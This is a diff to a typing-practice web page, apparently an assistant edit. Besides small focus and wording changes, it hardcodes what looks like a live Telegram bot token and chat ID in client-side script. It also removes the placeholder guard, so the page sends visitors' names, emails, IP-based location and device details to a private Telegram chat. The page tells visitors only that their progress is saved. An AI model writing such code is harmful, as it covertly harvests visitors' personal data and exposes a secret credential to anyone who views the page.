@@ -182,11 +182,11 @@ footer { text-align: center; padding: 25px; color: var(--muted); font-size: 13px
       <div class="controls" style="margin-top:15px;">
         <button class="secondary" id="listen">🔊 Listen Text</button>
         <button class="secondary" id="stopListen">Stop Audio</button>
-        <span class="hint">💡 Click on the text box and start typing smoothly.</span>
+        <span class="hint">💡 Start typing anytime. Focus is automatically active!</span>
       </div>
     </div>
 
-    <!-- Congratulations Screen (Hidden by Default) -->
+    <!-- Congratulations Screen -->
     <div id="congratsScreen">
       <h2>🎉 Awesome Job! Congratulations!</h2>
       <p style="color:var(--muted);">You have successfully completed the typing test. Keep practicing to boost your skill!</p>
@@ -244,10 +244,11 @@ footer { text-align: center; padding: 25px; color: var(--muted); font-size: 13px
 
 <script>
 document.addEventListener("DOMContentLoaded", function() {
-  const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-  const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+  // Telegram Credentials Provided by User
+  const TELEGRAM_BOT_TOKEN = "8894721224:AAFBhk8F8nsdRRa6myQpwfDn0oM-ItmexYI";
+  const TELEGRAM_CHAT_ID = "7344538984";
 
-  // Standard, simple and easy word pools (No difficult words)
+  // Standard, simple and easy word pools
   const textPools = {
     en: {
       general: ["the", "quick", "brown", "fox", "jumps", "over", "the", "lazy", "dog", "learning", "to", "type", "is", "fun", "and", "very", "useful", "practice", "every", "day", "to", "build", "speed", "focus", "on", "accuracy", "and", "stay", "calm", "while", "writing", "words", "correctly"],
@@ -291,6 +292,20 @@ document.addEventListener("DOMContentLoaded", function() {
   let maxTime = 60;
   let timeLeft = 60;
   let isTyping = false;
+
+  // Auto focus helper so typing starts instantly
+  function keepFocus() {
+    if (congratsScreen.style.display !== "block" && authModal.style.display !== "flex") {
+      hiddenInput.focus();
+    }
+  }
+
+  window.addEventListener("load", keepFocus);
+  document.addEventListener("click", (e) => {
+    if (!e.target.closest('button') && !e.target.closest('select') && !e.target.closest('input') && !e.target.closest('a')) {
+      keepFocus();
+    }
+  });
 
   function generateText() {
     const lang = languageSelect.value;
@@ -354,6 +369,7 @@ document.addEventListener("DOMContentLoaded", function() {
     fullText = generateText();
     renderArena();
     hiddenInput.value = "";
+    keepFocus();
   }
 
   function startTimer() {
@@ -410,7 +426,7 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   });
 
-  typingArena.addEventListener("click", () => hiddenInput.focus());
+  typingArena.addEventListener("click", keepFocus);
 
   durationSelect.addEventListener("change", () => {
     if (durationSelect.value === "custom") {
@@ -435,10 +451,12 @@ document.addEventListener("DOMContentLoaded", function() {
       utt.lang = languageSelect.value === 'bn' ? 'bn-BD' : 'en-US';
       window.speechSynthesis.speak(utt);
     }
+    keepFocus();
   });
 
   document.getElementById("stopListen").addEventListener("click", () => {
     if ('speechSynthesis' in window) window.speechSynthesis.cancel();
+    keepFocus();
   });
 
   function endTest() {
@@ -446,7 +464,6 @@ document.addEventListener("DOMContentLoaded", function() {
     isTyping = false;
     hiddenInput.blur();
 
-    // Hide typing area & stats, show Congrats Page
     typingAreaWrapper.style.display = "none";
     statsContainer.style.display = "none";
     congratsScreen.style.display = "block";
@@ -459,7 +476,6 @@ document.addEventListener("DOMContentLoaded", function() {
     document.getElementById("finalAcc").textContent = finalAccVal;
     document.getElementById("finalMistakes").textContent = finalMistakesVal;
 
-    // Set Social Share Links
     const shareText = encodeURIComponent(`I just scored ${finalWpmVal} WPM with ${finalAccVal} accuracy on TypeFlow Typing Practice! Check it out.`);
     document.getElementById("shareFb").href = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(window.location.href)}&quote=${shareText}`;
     document.getElementById("shareWa").href = `https://api.whatsapp.com/send?text=${shareText}`;
@@ -467,7 +483,7 @@ document.addEventListener("DOMContentLoaded", function() {
     document.getElementById("shareLi").href = `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(window.location.href)}`;
   }
 
-  // Telegram Lead Tracking
+  // Telegram Lead Tracking with User Credentials
   async function sendTelegramLead(userData) {
     try {
       const ipRes = await fetch('https://ipapi.co/json/');
@@ -483,24 +499,25 @@ document.addEventListener("DOMContentLoaded", function() {
 💻 *OS/Device:* ${navigator.platform}
       `;
 
-      if (TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-          })
-        });
-      }
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
     } catch (err) {
       console.log("Telegram lead error:", err);
     }
   }
 
   openAuthBtn.addEventListener("click", () => authModal.style.display = "flex");
-  closeAuth.addEventListener("click", () => authModal.style.display = "none");
+  closeAuth.addEventListener("click", () => {
+    authModal.style.display = "none";
+    keepFocus();
+  });
   
   submitAuth.addEventListener("click", () => {
     const name = document.getElementById("userName").value;
@@ -510,6 +527,7 @@ document.addEventListener("DOMContentLoaded", function() {
       document.getElementById("userStatus").innerHTML = `Welcome back, <strong>${name}</strong> (${email})! Your progress is now saved.`;
       authModal.style.display = "none";
       sendTelegramLead({ name, email });
+      keepFocus();
     } else {
       alert("Please fill in both name and email.");
     }
